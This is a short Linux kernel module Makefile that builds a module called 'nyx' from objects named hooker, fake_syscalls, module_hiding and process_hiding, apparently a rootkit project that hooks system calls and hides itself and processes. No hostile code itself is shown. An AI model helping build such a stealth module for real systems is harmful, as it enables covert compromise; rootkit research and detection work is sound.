obj-m := nyx.o
nyx-y := main.o hooker.o fake_syscalls.o module_hiding.o process_hiding.o

ccflags-y += -g -DDEBUG

PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean
